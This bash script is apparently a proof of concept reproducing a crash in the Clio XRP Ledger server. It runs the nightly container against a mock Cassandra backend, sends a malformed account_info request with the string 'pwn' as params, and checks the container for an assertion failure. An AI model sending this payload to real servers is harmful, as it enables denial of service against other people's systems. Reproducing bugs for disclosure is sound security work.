#!/usr/bin/env bash
# Reproduction against the published Clio image.
# Requires podman (or swap in docker) and python3.
set -e
D="$(cd "$(dirname "$0")" && pwd)"
W=$(mktemp -d)
MOCK=""

cleanup() {
    [ -n "$MOCK" ] && kill "$MOCK" 2>/dev/null
    podman rm -f clio-poc >/dev/null 2>&1
    rm -rf "$W"
}
trap cleanup EXIT

cp "$D/clio-config.json" "$W/cfg.json"
cp "$D/cassandra_mock.py" "$W/"

cd "$W"
python3 -I cassandra_mock.py >mock.log 2>&1 &
MOCK=$!
sleep 3

podman rm -f clio-poc >/dev/null 2>&1 || true
podman run -d --name clio-poc --network host -v "$W/cfg.json:/cfg.json:ro,Z" \
  --entrypoint /opt/clio/bin/clio_server ghcr.io/xrplf/clio:nightly --conf /cfg.json >/dev/null
sleep 6

echo "== before =="
curl -s -m 10 -X POST http://127.0.0.1:51233/ -H 'Content-Type: application/json' \
  -d '{"method":"account_info","params":[{}]}' -w '  HTTP %{http_code}\n'
echo "  container: $(podman ps --filter name=clio-poc --format '{{.Status}}')"

echo "== payload =="
curl -s -m 10 -X POST http://127.0.0.1:51233/ -H 'Content-Type: application/json' \
  -d '{"method":"account_info","params":"pwn"}' -w '  HTTP %{http_code}\n' || true
sleep 2

echo "== after =="
echo "  container: $(podman ps -a --filter name=clio-poc --format '{{.Status}}')"
podman logs clio-poc 2>&1 | grep -i 'assertion' | head -2 | sed 's/^/  /'
